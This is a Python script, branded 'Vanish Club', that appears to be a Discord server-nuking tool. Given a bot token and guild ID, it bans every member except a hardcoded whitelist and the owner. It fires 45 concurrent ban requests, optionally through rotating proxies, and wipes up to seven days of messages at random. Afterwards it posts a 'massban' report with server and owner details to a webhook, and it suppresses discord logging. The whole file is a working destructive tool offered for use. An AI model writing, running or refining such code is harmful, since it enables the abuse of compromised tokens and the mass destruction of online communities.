import os, asyncio, aiohttp, random, time, discord, logging
from discord.ext import commands
from itertools import cycle
from datetime import datetime, timezone, timedelta

for n in ('discord','discord.client','discord.gateway','discord.http','discord.ws','discord.webhook'):
    l = logging.getLogger(n); l.setLevel(logging.CRITICAL); l.propagate = False
logging.getLogger().setLevel(logging.WARNING)

RESET = "\033[0m"
def _rgb(r,g,b): return f"\033[38;2;{r};{g};{b}m"
def _grad(t, a, b):
    n = len(t)
    if n == 0: return ""
    if n == 1: return _rgb(*a)+t+RESET
    return "".join(_rgb(
        int(a[0]+(b[0]-a[0])*i/(n-1)),
        int(a[1]+(b[1]-a[1])*i/(n-1)),
        int(a[2]+(b[2]-a[2])*i/(n-1))
    )+c for i,c in enumerate(t)) + RESET

T_OK = _grad("SUCCESS", (0,255,130), (0,200,60))
T_WARN = _grad("WARN", (255,200,0), (255,120,0))
T_INFO = _grad("INFO", (100,200,255), (0,90,255))
T_FAIL = _grad("FAIL", (255,120,120), (220,0,0))

def ok(m): print(f"[{T_OK}] {m}", flush=True)
def warn(m): print(f"[{T_WARN}] {m}", flush=True)
def info(m): print(f"[{T_INFO}] {m}", flush=True)
def fail(m): print(f"[{T_FAIL}] {m}", flush=True)

WEBHOOK, CONC, API, IDS_FILE = "", 45, "v9", "ids.txt"
WL = {892224428052725791, 1534213453131157514, 1437446260662472704, 1437445788878901288, 970685364450758767, 1169811792680194078, 1067447771570901064}
proxies = cycle(open("proxies.txt").read().splitlines()) if os.path.exists("proxies.txt") else cycle([])
bot = commands.Bot(command_prefix="v", help_command=None, intents=discord.Intents.all(), chunk_guilds_at_startup=False)


async def report(s, g, title, lines):
    if not WEBHOOK: return
    try:
        c = discord.ui.Container()
        c.add_item(discord.ui.Section(
            discord.ui.TextDisplay(f"## Vanish Club\n-# {title}"),
            accessory=discord.ui.Thumbnail(str(g.icon.url)) if g.icon else None,
        ))
        c.add_item(discord.ui.Separator())
        c.add_item(discord.ui.TextDisplay(
            f"**Server:** {g.name}\n`{g.id}`\n"
            f"**Owner:** `{g.owner_id}`\n"
            f"**Boosts:** {g.premium_subscription_count or 0}"
        ))
        c.add_item(discord.ui.Separator())
        c.add_item(discord.ui.TextDisplay("\n".join(lines)))
        c.add_item(discord.ui.Separator())
        c.add_item(discord.ui.TextDisplay(
            f"-# Vanish Club | {datetime.now(timezone(timedelta(hours=7))).strftime('%d/%m/%Y %H:%M')}"
        ))
        v = discord.ui.LayoutView(timeout=None); v.add_item(c)
        await discord.Webhook.from_url(WEBHOOK, session=s).send(view=v)
        ok("Sent massban log")
    except Exception as ex: fail(f"Failed to send massban log: {ex}")


async def massban(g, token, up):
    if not g: return fail("Guild not found")
    proxy = "http://" + next(proxies) if up else None

    ids, sk = [], 0
    info("Fetching members...")
    async for m in g.fetch_members(limit=None):
        if m.id in WL or m.id in (bot.user.id, g.owner_id): sk += 1; continue
        ids.append(str(m.id))
    ok(f"Fetched {len(ids)} | Skipped {sk}")

    with open(IDS_FILE, "w") as f:
        f.write("\n".join(ids))
    ok(f"Saved {len(ids)} IDs -> {IDS_FILE}")

    if not ids: return warn("Nothing to ban")

    done, failed, sem = [], [], asyncio.Semaphore(CONC)

    async def ban(s, u):
        async with sem:
            while True:
                try:
                    async with s.put(f"https://discord.com/api/{API}/guilds/{g.id}/bans/{u}",
                        headers={"Authorization": f"Bot {token}"},
                        json={"delete_message_days": random.randint(0, 7)}, proxy=proxy) as r:
                        if r.status in (200, 201, 204): done.append(u); ok(f"Banned: {u}"); return
                        if r.status == 429:
                            wait = (await r.json()).get("retry_after", 1)
                            warn(f"Rate limited, wait {wait}s"); await asyncio.sleep(wait); continue
                        fail(f"Failed to ban: {u} | {r.status}"); failed.append(u); return
                except Exception as e: fail(f"Err: {u} | {e}"); await asyncio.sleep(1)

    t = time.perf_counter()
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=CONC)) as s:
        await asyncio.gather(*[ban(s, u) for u in ids])
        dt = time.perf_counter() - t
        fresh = await bot.fetch_guild(g.id, with_counts=True)
        ok(f"Banned {len(done)}/{len(ids)} in {dt:.2f}s")
        await report(s, g, "Ban All Reporter", [
            f"• Banned: {len(done)}",
            f"• Skipped: {sk}",
            f"• Failed: {len(failed)}",
            f"• Remaining members: {fresh.member_count}",
            f"• Time: {dt:.2f}s",
        ])


@bot.event
async def on_ready():
    ok(f"Logged in: {bot.user}")
    await massban(bot.get_guild(int(GUILD)), TOKEN, USE_PROXY)
    info("Done"); await bot.close()


if __name__ == "__main__":
    TOKEN = input("Token: ").strip(); GUILD = input("Guild: ").strip()
    if not (TOKEN and GUILD): fail("Missing input"); os._exit(0)
    USE_PROXY = input("Proxy? (y/n): ").strip().lower() == "y"
    if USE_PROXY and not os.path.exists("proxies.txt"): fail("proxies.txt missing"); os._exit(0)
    try: bot.run(TOKEN, log_handler=None, reconnect=False)
    except discord.LoginFailure: fail("Invalid token")
    except Exception as e: fail(f"{e}")
    finally: os._exit(0)
    